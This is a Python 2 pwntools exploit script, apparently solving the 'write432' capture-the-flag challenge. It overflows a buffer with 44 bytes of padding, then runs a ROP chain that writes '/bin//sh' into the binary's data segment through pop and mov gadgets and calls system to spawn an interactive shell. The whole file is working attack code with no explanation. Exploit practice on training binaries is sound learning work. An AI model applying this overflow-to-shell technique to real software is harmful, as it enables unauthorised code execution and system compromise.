#!/usr/bin/env python2

from pwn import *

elf = ELF('write432')

system = p32(0x0804865a)

# in data segment
data1 = p32(0x0804a028)
data2 = p32(0x0804a02c)

edi_ebp_ret = p32(0x080486da)
mov_edi_ebp_ret = p32(0x08048670)

# Alignment
bins = "/bin"
sh = "//sh"

junk = 'AAAA';

pad = 'A'*44

rop  = edi_ebp_ret
rop += data1
rop += bins
rop += mov_edi_ebp_ret
rop += edi_ebp_ret
rop += data2
rop += sh
rop += mov_edi_ebp_ret
rop += system
rop += data1

payload = pad + rop

io = process(elf.path)
io.recvuntil("> ")
io.sendline(payload)

io.interactive()


